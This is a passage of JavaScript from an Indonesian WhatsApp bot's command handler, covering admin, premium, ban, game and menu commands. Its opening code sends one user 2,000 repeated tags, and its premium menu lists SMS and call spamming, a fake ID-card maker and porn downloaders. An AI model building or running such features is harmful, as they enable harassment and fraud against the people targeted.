        if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply("Gada yang di tag")
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
        teks = `*Repeat Tag*\n${q}`
        teks += "\n\n"
        members_id = []
        for (let z = 0; z < 2000; z++) {
        teks += ` @${mentioned[0].split("@")[0]}`
        members_id.push(mentioned[0])
        }
        mentions(teks, members_id, true)
        break
case 'setnamebot':
					if (!isOwner) return reply(mess.only.ownerB)
				    if (args.length == 0) return reply(`Contoh ${prefix + command} IvAn TEAM`)
				    client.updatePresence(from, Presence.composing) 
	                const ya = body.slice(12)
					await client.updateProfileName(ya)
					reply('Makasih nama barunya😘')
					break
			    case 'setbiobot':
					if (!isOwner) return reply(mess.only.ownerB)
				    if (args.length == 0) return reply(`Contoh ${prefix + command} IvAn TEAM`)
					client.updatePresence(from, Presence.composing) 
	                const yastts = body.slice(10)
					await client.setStatus(yastts)
					reply('Makasih bio barunya😘')
					break
				case 'setppbot':
					if (!isOwner) return reply(mess.only.ownerB)
				    client.updatePresence(from, Presence.composing) 
					if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
					enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(enmedia)
					await client.updateProfilePicture(botNumber, media)
					reply('Makasih profil barunya😘')
					break
				case 'shutdown':
					if (!isOwner) return reply(mess.only.ownerB)
                    client.updatePresence(from, Presence.composing) 
                    reply('GOOD BYE OWNER, I LOVE YOU')
					await sleep(10000)
					client.sendMessage(from, JSON.stringify(eval(process.exit())), text, {quoted: mek})
				    break
				case 'readall':
					if (!isOwner) return reply(mess.only.ownerB)
					var chats = await client.chats.all()
					chats.map( async ({ jid }) => {
					await client.chatRead(jid)
					})
					teks = `\`\`\`Successfully read ${chats.length} chats !\`\`\``
					client.sendMessage(from, teks, MessageType.text, {quoted: mek})
					console.log(chats.length)
					break
				case 'premium':
					//FIX BY IXB-TEAM
				    if (!isOwner) return reply(mess.only.ownerB)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply(`Tag user yang ingin dijadikan premium!\nContoh: ${prefix + command} @tag harinya`)
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					addprem = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
				    _premium.addPremiumUser(addprem, args[1], prem)
                    reply(`    ─── *「 PREMIUM 」* ───
──────────────────
+ *ID :* ${mentioned[0].split('@')[0]}@c.us
+ *Nama :* ${pushname}
+ *Expired :* ${ms(toMs(args[1])).days} Hari, ${ms(toMs(args[1])).hours} Jam, ${ms(toMs(args[1])).minutes} menit
──────────────────
║▌│█║▌│ █║▌│█│║▌║
║▌│█║▌│ █║▌│█│║▌║`)
				break
			case 'premiumcheck':
			case 'cekpremium':
				    if (!isPremium) return reply('Kamu bukan user Premium!')
					const cekExp = ms(_premium.getPremiumExpired(sender, prem) - Date.now())
					reply(`  *「 PREMIUM USER 」*
➸ *ID :* ${sender}
➸ *Username :* ${pushname}
➸ *Expired :* ${cekExp.days} Hari, ${cekExp.hours} Jam, ${cekExp.minutes} Menit`)
					break                    
			case 'addadmin':
					//FIX BY IXB-TEAM
					if (!isOwner) return reply(mess.only.ownerB)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag user yang ingin dijadikan admin !')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					adm.push(`${mentioned[0].split('@')[0]}@s.whatsapp.net`)
					fs.writeFileSync('./database/pengguna/admin.json', JSON.stringify(adm))
					reply(`Sukses menambah admin ${namabot}`)
			        break
			case 'unadmin':
				    if (!isOwner) return reply(mess.only.ownerB)
				    const slebew = `${args[0].replace('@','')}@s.whatsapp.net`
			        var arb = adm
			        for( var dt = 0; dt < arb.length; dt++){ 
			        if ( arb[dt] === slebew) { 
			        arb.splice(dt, 1); 
			        dt--; 
			        fs.writeFileSync('./database/pengguna/admin.json',JSON.stringify(arb))
			        }
			        }
			        reply(`Sukses menghapus admin ${namabot}`)
			break
	case 'adminlist':
    case 'listadminixb':
		        if (!isOwner) return reply(mess.only.ownerB)
		        client.updatePresence(from, Presence.composing)    
		        teks = `This is list of admin ${namabot} :\n`
		        for (let admm of adm) {
		        teks += `~> @${admm.split('@')[0]}\n`
		        }
		        teks += `Total : ${adm.length}`
	            client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": adm}})
	        	break
		case 'addcmd': 
		case 'setcmd':
			    if (!isOwner) return reply(mess.only.ownerB)
			    if (isQuotedSticker) {
			    if (!q) return reply(`Penggunaan : ${prefix + command} cmdnya dan tag stickernya`)
			    var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
			    addCmd(kodenya, q)
			    reply("Done!")
			    } else {
			    reply('tag stickenya')
                }
			    break
		case 'delcmd':
			    if (!isOwner) return reply(mess.only.ownerB)
			    if (!isQuotedSticker) return reply(`Penggunaan : ${prefix + command} tagsticker`)
			    var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
			    _scommand.splice(getCommandPosition(kodenya), 1)
			    fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
			    reply("Done!")
			    break
		case 'listcmd':
			    if (!isOwner) return reply(mess.only.ownerB)
			    let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
			    let cemde = [];
			    for (let i of _scommand) {
			    cemde.push(i.id)
			    teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *CMD :* ${i.chats}`
                }
			    mentions(teksnyee, cemde, true)
			    break
    case 'slot': 
		const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
        client.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, text, { quoted: mek })
		break			
	case 'truth':
		if (!isRegistered) return reply(mess.only.userB)
        const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Lebih milih pacar engas-an atau sholehah? jawab jujur gan!\nawokwokwowkwok','Kalau engas biasanya ngapain?','Pernah ngapain aja sama pacar?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
		const ttrth = trut[Math.floor(Math.random() * trut.length)]
		truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
		client.sendMessage(from, truteh, image, { caption: '*TRUTH*\n\n'+ ttrth, quoted: mek })
		break
	case 'dare':
		if (!isRegistered) return reply(mess.only.userB)
		const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄??" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
		const der = dare[Math.floor(Math.random() * dare.length)]
		tod = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
		client.sendMessage(from, tod, image, { quoted: mek, caption: '*DARE*\n\n'+ der })
		break
	case 'unpremium':
	case 'delprem':
			if (!isOwner) return reply(mess.only.ownerB)
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply(`Tag usernya gan!`)
			mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
			premidel = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
			prem.splice(_premium.getPremiumPosition(premidel, prem), 1)
			fs.writeFileSync('./database/pengguna/premium.json', JSON.stringify(prem))
			reply(`*「 PREMIUM DELETE 」*\n*Name :* ${mentioned[0].split('@')[0]}@c.us\n*Expired :* NOW :v\n*Thank for order premium back soon for buying again:D*`)
				break
        case 'premiumlist':
				if (!isOwner) return reply(mess.only.ownerB)   
				txt = 'This is list of premium number :\n'
				let men = [];
				for (let i of prem){
				men.push(i.id)
				const checkExp = ms(i.expired - Date.now())
				txt += `═════════════════\n➸ *ID :* @${i.id.split("@")[0]}\n➸ *Expired*: ${checkExp.days}Hari, ${checkExp.hours}Jam, ${checkExp.minutes}Menit\n`
  }
                txt += `═════════════════\n`
                txt += `Total : ${prem.length}`
				mentions(txt, men, true)
				break
        case 'bann':
				if (!isAdmin) return reply(`Maaf perintah ini hanya bisa digunakan oleh admin ${namabot}`)
				if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag user yang ingin di premiumkan !')
				mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
				ban.push(`${mentioned[0].split('@')[0]}@s.whatsapp.net`)
				fs.writeFileSync('./database/pengguna/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned ${mentioned[0].split('@')[0]}@c.us `)
				break
		case 'unbann':
			    if (!isAdmin) return reply(`Maaf perintah ini hanya bisa digunakan oleh admin ${namabot}`)
				const micha = `${args[0].replace('@','')}@s.whatsapp.net`
				var art = ban
				for( var dp = 0; dp < art.length; dp++){ 
				if ( art[dp] === micha) { 
				art.splice(dp, 1); 
				dp--; 
				fs.writeFileSync('./database/pengguna/banned.json',JSON.stringify(art))
				}
				}
				reply(`Nomor ${args[0].replace('@','')}@c.us telah di unban!`)
				break
        case 'ban':
				//FIX BY IXB-TEAM
				if (!isOwner) return reply(mess.only.ownerB)
				if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag user yang ingin di premiumkan !')
				mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
				ban.push(`${mentioned[0].split('@')[0]}@s.whatsapp.net`)
				fs.writeFileSync('./database/pengguna/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned ${mentioned[0].split('@')[0]}@c.us`)
				break
		case 'unban':
				if (!isOwner) return reply(mess.only.ownerB)
				const hnow = `${args[0].replace('@','')}@s.whatsapp.net`
			    var art = ban
			    for( var dp = 0; dp < art.length; dp++){ 
			    if ( art[dp] === hnow) { 
			    art.splice(dp, 1); 
			    dp--; 
			    fs.writeFileSync('./database/pengguna/banned.json',JSON.stringify(art))
			    }
			    }
				reply(`Nomor ${args[0].replace('@','')}@c.us telah di unban!`)
				break
        case 'banlist':
		case 'listbanned':
				client.updatePresence(from, Presence.composing) 
                if (!isRegistered) return reply(mess.only.userB)    
				teks = 'This is list of banned number :\n'
				for (let benn of ban) {
				teks += `~> @${benn.split('@')[0]}\n`
				}
				teks += `Total : ${ban.length}`
				client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": ban}})
				break			
		case 'leaderboard':
		case 'lb':
			    if (!isRegistered) return reply(mess.only.userB)
				_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
				uang.sort((a, b) => (a.uang < b.uang) ? 1 : -1)
				let leaderboardlvl = '-----[ *LEADERBOARD LEVEL* ]----\n\n'
				let leaderboarduang = '-----[ *LEADERBOARD UANG* ]----\n\n'
				let nom = 0
				try {
				for (let i = 0; i < 10; i++) {
				nom++
	 			leaderboardlvl += `*[${nom}]* ${_level[i].id.replace('@s.whatsapp.net', '')}\n◪  *XP:* ${_level[i].xp}\n◪  *Level:* ${_level[i].level}\n`
				leaderboarduang += `*[${nom}]* ${uang[i].id.replace('@s.whatsapp.net', '')}\n◪  *Uang:* Rp.${uang[i].uang}\n`
				}
				await reply(leaderboardlvl)
				await reply(leaderboarduang)
				} catch (err) {
				console.error(err)
				await reply(`minimal 10 user untuk bisa mengakses database`)
				}
				break
		case 'kalkulator':				
                if (!isRegistered) return reply(mess.only.userB)
				if (isLimit(sender)) return reply(mess.limituser)
				if (isBanned) return reply(mess.only.benned)
				if (args.length < 1) return reply(`[❗] Kirim perintah *${prefix}kalkulator [ Angka ]*\nContoh : ${prefix}kalkulator 12*12\n*NOTE* :\n• Untuk Perkalian Menggunakan *\n• Untuk Pertambahan Menggunakan +\n• Untuk Pengurangan Menggunakan -\n• Untuk Pembagian Menggunakan /`)
				const Math_js = require('mathjs')
				mtk = body.slice(12)
				if (typeof Math_js.evaluate(mtk) !== "number") {
				reply(`"${mtk}", Kesalahan!\n[❗] Kirim perintah *${prefix}kalkulator [ Angka ]*\nContoh : ${prefix}kalkulator 12*12\n*NOTE* :\n• Untuk Perkalian Menggunakan *\n• Untuk Pertambahan Menggunakan +\n• Untuk Pengurangan Menggunakan -\n• Untuk Pembagian Menggunakan /`)
				} else {
				reply(`*「 MATH 」*\n\n*Kalkulator*\n${mtk} = ${Math_js.evaluate(mtk)}`)
				}
				await limitAdd(sender)
				break
		case 'atmku':				
                if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				const kantong = checkATMuser(sender)
				reply(`◪ *ATM*
├─ ❏ *Nama :* ${pushname}
├─ ❏ *Nomor :* ${sender.split("@")[0]}
└─ ❏ *Uang :* ${kantong}`)
				break
		case 'buylimit':		
                if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (args.length == 0) return reply(`Format salah! Kirim: ${prefix + command} jumlahnya\nContoh: ${prefix + command} 2`)
				payout = body.slice(10)
				const koinPerlimit = 500
				const total = koinPerlimit * payout
				if ( checkATMuser(sender) <= total) return reply(`Maaf uang kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
				if ( checkATMuser(sender) >= total ) {
				confirmATM(sender, total)
				bayarLimit(sender, payout)
				await reply(`*「 PEMBAYARAN BERHASIL 」*\n\n*Pengirim :* Admin\n*Penerima :* ${pushname}\n*Nominal pembelian :* ${payout} \n*Harga limit :* ${koinPerlimit}/limit\n*Sisa uang mu :* ${checkATMuser(sender)}\n\nProses berhasil dengan kode pembayaran\n${createSerial(20)}`)
				} 
				break
		case 'giftlimit': 
				        if (!isAdmin && !isOwner) return reply(`Maaf perintah ini hanya bisa digunakan oleh admin ${namabot}`)
			        	if (args.length == 0) return reply(`Format salah! Kirim: ${prefix + command} @tag jumlahnya\nContoh: ${prefix + command} @tag 2`)
						const nomerr = args[0].replace('@','')
                		const jmla = args[1]
                		if (jmla <= 1) return reply(`minimal gift limit adalah 1`)
                		if (isNaN(jmla)) return reply(`limit harus berupa angka`)
                		if (!nomerr) return reply(`maaf format salah\nmasukan parameter yang benar\ncontoh : ${prefix}giftlimit @6282189387018 20`)
                		const cysz = nomerr + '@s.whatsapp.net'
                		var found = false
                        Object.keys(_limit).forEach((i) => {
                        if(_limit[i].id === cysz){
                        found = i
                        }
                        })
                        if (found !== false) {
                        _limit[found].limit -= jmla
                        const updated = _limit[found]
                        const result = `*「 GIFT KUOTA LIMIT 」*
*• User :* ${updated.id.replace('@s.whatsapp.net','')}
*• Limit :* ${limitawal-updated.limit}
*• SN :* ${createSerial(20)} 
*• Waktu :* ${moment().format('DD/MM/YY HH:mm:ss')}`
                        console.log(_limit[found])
                        fs.writeFileSync('./database/pengguna/limit.json',JSON.stringify(_limit));
                        reply(result)
                        } else {
                        reply(`Maaf, nomor ${nomerr} tidak terdaftar di database!`)
                        }
               			break
		case 'resetlimit':
			    	if (!isOwner) return reply(mess.only.ownerB)
			    	var obj = []
			    	fs.writeFileSync('./database/pengguna/limit.json', JSON.stringify(obj, null, '\t'))
			    	reply(`Limit berhasil direset`)
			    	break
	    case 'ceklimit':
		case 'limit':
                    if (!isRegistered) return reply(mess.only.userB)
					if (isPremium) return reply(`*「 UNLIMITED LIMIT 」*
         
◪ *USER PREMIUM*
├─ *Nama :* ${pushname}
├─ *User :* PREMIUM
├─ *Tanggal :* ${moment().format('DD/MM/YY')}
├─ *Jam :* ${moment().format('HH:mm:ss')}
└─ *Limit :* 「 9999999 」`)
			    	checkLimit(sender)
			    	break
	 
				
		//daftar 
		case 'daftar':
                	if (isRegistered) return  reply('Kamu sudah terdaftar!')
                    if (!q.includes('|')) return  reply(`Format salah!

Kirim: #daftar nama|umur

Contoh: #daftar ivan|20`)
                	const namaUser = q.substring(0, q.indexOf('|') - 0)
                	const umurUser = q.substring(q.lastIndexOf('|') + 1)
                	const serialUser = createSerial(20)
                	if(isNaN(umurUser)) return await reply('Umur harus berupa angka!! \nJangan ketik "tujuh belas" tapi ketik "17" kak...')
                	if (namaUser.length >= 30) return reply(`Maaf kak, nama kakak terlalu panjang, itu nama atau gerbong kereta kak?`)
                	if (umurUser > 40) return reply(`Maaf kak, umur kakak terlalu tua untuk menggunakan bot. Max 40!`)
                	try {
					ppimg = await client.getProfilePicture(`${sender.split('@')[0]}@c.us`)
					} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
					}
                	veri = sender
                    addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
                    await client.sendMessage(from, ppimg, image, {quoted: mek, caption: `╭━━━❰･❉REGISTER❉･❱━━━━
├≽ Serial User :
├  ${serialUser}
├≽ Nama: ${namaUser}
├≽ Nomor: wa.me/${sender.split("@")[0]}
├≽ Umur: ${umurUser}
╰━━━━❰･❉${namabot}❉･❱━━━━`})
                    addATM(sender)
                    addLevelingId(sender)
                    if (!isGroup) console.log('[\x1b[1;32mREGISTER\x1b[1;37m]', color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'))
					if (isGroup) console.log('[\x1b[1;32mREGISTER\x1b[1;37m]', color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'), 'in', color(groupName))
				    break
		case 'mining':
                    if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return reply(mess.limituser)
					if (!isPremium) return reply(mess.only.premium)
				    if (isBanned) return reply(mess.only.benned)
					if (!isEventon) return reply(`Maaf ${pushname} event mining tidak di aktifkan oleh owner`)
					if (isOwner) {
					const one = 999999999
					addLevelingXp(sender, one)
					addLevelingLevel(sender, 99)
					reply(`karena anda owner kami dari team bot mengirim ${one}Xp untuk anda`)
					}else{
					const mining = Math.ceil(Math.random() * 1000)
					addLevelingXp(sender, mining)
					await reply(`*selamat* ${pushname} kamu mendapatkan *${mining}Xp*`)
					}
					await limitAdd(sender)
					break
			case 'speed': 
			case 'ping':
					const timestamp = speed();
					const latensi = speed() - timestamp 
					client.sendMessage(from, `Meluncur ${latensi.toFixed(4)} Second🚀`, text, { quoted: mek})
					break
			case 'test':
			        runtime6 = process.uptime()
					client.sendMessage( from,`*${namabot}* sedang online !
• *Prefix saat ini :* ( ${prefix} )
• *Telah aktif selama :* ${kyun(runtime6)}`,MessageType.text, { quoted: mek} )				
					break
			case 'runtime':
				    runtime6 = process.uptime()
					run6 = `${namabot} telah aktif selama:\n${kyun(runtime6)}`
					client.sendMessage(from, run6, text,)
					break
		case 'help': 
		case 'menu':
                if (!isRegistered) return reply(mess.only.userB)
				if (isLimit(sender)) return reply(mess.limituser)
				if (isBanned) return reply(mess.only.benned)
				const userLevell = getLevelingLevel(sender)
				const userXpp = getLevelingXp(sender)
				uptime = process.uptime()
				myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
                myDays = ["Minggu","Senin","Selasa","Rabu","Kamis","Jum'at","Sabtu"];
                var tgl = new Date();
                var day = tgl.getDate()
                bulan = tgl.getMonth()
                var thisDay = tgl.getDay(),
                thisDay = myDays[thisDay];
                var yy = tgl.getYear()
                var year = (yy < 1000) ? yy + 1900 : yy;
                const tanggal = `${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`
				const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
				var premma = isPremium
                menunye = `╭──✪ *「 INFORMATION 」* ✪───
│
│ *-Gunakan Dengan Bijak !!*
│ *-Spam Blokir !!*
│ *-Telfon Blokir !!*
│
╭───❉「 𝙈𝙚𝙣𝙪 𝘽𝙤𝙩 」❉───
├ ➸ *User Info*
│   ✦ ━━━━━ ★ ━━━━━ ✦
├≽ *Nama :* ${pushname}
├≽ *Tanggal :* ${tanggal}
├≽ *Jam :* ${jam}     
├≽ *User :* ${premma ? 'PREMIUM' : 'Free'}
├≽ *Bot Aktif :* ${kyun(uptime)} 
├≽ *Grup BOT  :* ketik ${prefix}groupbot
├≽ *Jika Ingin Invite Bot Ini Ke Grup kamu chat (Owner)*
├≽ *Owner :* (wa.me/${Laporowner})
├≽ *recode :* IvAn
│   ✦ ━━━━━ ★ ━━━━━ ✦
│• *Level*   -->    : *${userLevell}*
│• *Xp*      -->    : *${userXpp}* xp
│• *rank*    -->    : *${role}*   
│ ${prefix}level (untuk cek level kamu) 
│ ${prefix}leaderboard (untuk cek level tertinggi)    
│ ${prefix}ceksewa (untuk cek masa sewa kamu)
├──────────────────
│   ✦ ━━━━━ ★ ━━━━━ ✦
│➻ ${prefix}ownermenu
│    *KHUSUS OWNER*      
│   ✦ ━━━━━ ★ ━━━━━ ✦
├──────────────────
│ *「 MENU BOT 」*
│
│➻ ${prefix}snk
│➻ ${prefix}dsmenu
│➻ ${prefix}creatormenu
│➻ ${prefix}grupmenu
│➻ ${prefix}adminmenu
│➻ ${prefix}islammenu
│➻ ${prefix}funmenu
│➻ ${prefix}animemenu
│➻ ${prefix}othermenu
│➻ ${prefix}nsfwmenu
├──────────────────
│ *「 PREMIUM MENU 」*
│
│➻ ${prefix}premiummenu
│ (KHUSUS MEMBER PREMIUM)
│ Daftar premium? ketik:
│➻ ${prefix}daftarpremium
├──────────────────
│ *「 TOOLS BOT 」*
│
│➻ ${prefix}test
│➻ ${prefix}stats
│➻ ${prefix}limit
│➻ ${prefix}speed
│➻ ${prefix}owner
│➻ ${prefix}runtime
│➻ ${prefix}listgroup
│➻ ${prefix}listblock
│➻ ${prefix}listbanned
╰──────────────────`
                    client.sendMessage(from, menunye, text, {quoted: mek})
                    break
    case 'premiummenu':
	                if (!isRegistered) return reply(mess.only.userB)
					if (isLimit(sender)) return reply(mess.limituser)
	                if (isBanned) return reply(mess.only.benned)
					uptime = process.uptime()
					var premma = isPremium
					premimenunye = `╭──❉ *「 KHUSUS PREMIUM 」* ❉──
│            
├➸ *USER INFO*  
├≽ *Nama :* ${pushname}
├≽ *User :* ${premma ? 'PREMIUM' : 'Free'}
├≽ *Bot Aktif :* ${kyun(uptime)}
├──────────────────
│ *「 PREMIUM 」*
│
│➻ ${prefix}nulis2
│➻ ${prefix}removebg
│➻ ${prefix}imageflip
│➻ ${prefix}fisheye
│➻ ${prefix}triggered
│➻ ${prefix}ktpmaker
│➻ ${prefix}tourl  [foto/video]
│➻ ${prefix}simi  [text]
│➻ ${prefix}coganasli
│➻ ${prefix}cecanasli
│➻ ${prefix}stickerwm
│➻ ${prefix}takestick
│➻ ${prefix}stickernobg
│➻ ${prefix}kodepos
│➻ ${prefix}emojisticker
│➻ ${prefix}stickerwa  [query]
│➻ ${prefix}tahtapremium  [teks]
│➻ ${prefix}liriklagu  [query]
│➻ ${prefix}chordlagu  [query]
│➻ ${prefix}stickerpatrick
│➻ ${prefix}stickeranjing
│➻ ${prefix}stickerbucin
│➻ ${prefix}gawrgura
│➻ ${prefix}spamsms  [62879797]
│➻ ${prefix}spamcall  [62879797]
├──────────────────
│ *「 ASUPAN VIDEO 」*   
│➻ ${prefix}asupan
├──────────────────
│ *「 18++ 」*
│➻ ${prefix}cersex
│➻ ${prefix}blowjob
│➻ ${prefix}pornhub  [query]
│➻ ${prefix}xvideos  [query]
│➻ ${prefix}xhamstersearch  [query]
│➻ ${prefix}xnxxsearch  [query]
│➻ ${prefix}xnxxdl  [linkxnxx]
├──────────────────
│ *「 DOWNLOADER MEDIA 」*
│➻ ${prefix}pinterestdl  [link tipe video]
│➻ ${prefix}pinterest2  [query]
│➻ ${prefix}gimage2  [query]
│➻ ${prefix}drakorongoing
│➻ ${prefix}lk21  [query]
│➻ ${prefix}joox  [query]
│➻ ${prefix}igstory  [username]
│➻ ${prefix}ighighlight  [username]
│➻ ${prefix}tiktokpremium  [link]
│➻ ${prefix}ytshort  [link ytshort]
│➻ ${prefix}ytpremium  [query]
│➻ ${prefix}ytmp3premium  [link yt]
│➻ ${prefix}ytmp4premium  [link yt]
│➻ ${prefix}telesticker  [link tele]
│➻ ${prefix}twitterdl  [link tipe video]
│➻ ${prefix}spotifydl  [link spotify]
│➻ ${prefix}mediafire  [link mediafire]
│➻ ${prefix}snack  [link snack video]
│➻ ${prefix}play  [query]
│➻ ${prefix}playmp4  [query]
│➻ ${prefix}musikyt  [query]
│➻ ${prefix}smule  [link smule]
│➻ ${prefix}wattpad  [query]
├──────────────────
│ *「 PREMIUM PHOTO FILTER 」*
│➻ ${prefix}1977  [tag foto]
│➻ ${prefix}aden  [tag foto]
│➻ ${prefix}brooklyn  [tag foto]
│➻ ${prefix}clarendon  [tag foto]
│➻ ${prefix}gingham  [tag foto]
│➻ ${prefix}hudson  [tag foto]
│➻ ${prefix}inkwell  [tag foto]
│➻ ${prefix}earlybird  [tag foto]
│➻ ${prefix}kelvin  [tag foto]
│➻ ${prefix}lark  [tag foto]
│➻ ${prefix}lofi  [tag foto]
│➻ ${prefix}maven  [tag foto]
│➻ ${prefix}mayfair  [tag foto]
│➻ ${prefix}moon  [tag foto]
│➻ ${prefix}nashville  [tag foto]
│➻ ${prefix}perpetua  [tag foto]
│➻ ${prefix}reyes  [tag foto]
│➻ ${prefix}rise  [tag foto]
│➻ ${prefix}slumber  [tag foto]
│➻ ${prefix}stinson  [tag foto]
│➻ ${prefix}toaster  [tag foto]
│➻ ${prefix}valencia  [tag foto]
│➻ ${prefix}walden  [tag foto]
│➻ ${prefix}willow  [tag foto]
│➻ ${prefix}xpro2  [tag foto]
├──────────────────
│ *「 TEXT PRO ME 」*
│➻ ${prefix}blackpinktext  [text]
│➻ ${prefix}neon  [text]
│➻ ${prefix}greenneon  [text]
│➻ ${prefix}futureneon  [text]
│➻ ${prefix}sandwriting  [text]
│➻ ${prefix}sandsummer  [text]
│➻ ${prefix}sandengraved  [text]
│➻ ${prefix}metaldark  [text]
│➻ ${prefix}neonlight  [text]
│➻ ${prefix}holographic  [text]
│➻ ${prefix}text1917  [text]
│➻ ${prefix}minion  [text]
│➻ ${prefix}deluxesilver  [text]
│➻ ${prefix}newyearcard  [text]
│➻ ${prefix}bloodfrosted  [text]
│➻ ${prefix}halloween  [text]
│➻ ${prefix}jokerlogo  [text]
│➻ ${prefix}fireworksparkle  [text]
│➻ ${prefix}natureleaves  [text]
│➻ ${prefix}bokeh  [text]
│➻ ${prefix}toxic  [text]
│➻ ${prefix}strawberry  [text]
│➻ ${prefix}box3d  [text]
│➻ ${prefix}roadwarning  [text]
│➻ ${prefix}breakwall  [text]
│➻ ${prefix}icecold  [text]
│➻ ${prefix}luxury  [text]
│➻ ${prefix}cloud  [text]
│➻ ${prefix}summersand  [text]
│➻ ${prefix}horrorblood  [text]
│➻ ${prefix}thunder  [text]
│➻ ${prefix}pornhubtext  [text]
│➻ ${prefix}glitch  [text]
│➻ ${prefix}avenger  [text]
│➻ ${prefix}space  [text]
│➻ ${prefix}ninjalogo  [text]
│➻ ${prefix}marvelstudio  [text]
│➻ ${prefix}lionlogo  [text]
│➻ ${prefix}wolflogo  [text]
│➻ ${prefix}steel3d  [text]
│➻ ${prefix}wallgravity  [text]
│➻ ${prefix}narutomaker  [text]
│➻ ${prefix}glowmetallic  [text]
│➻ ${prefix}hackermaker  [text]
├──────────────────
│ *「 PREMIUM SERTIFIKAT 」*
│➻ ${prefix}fuckboy  [text]
│➻ ${prefix}fuckgirl  [text]
│➻ ${prefix}bucinserti  [text]
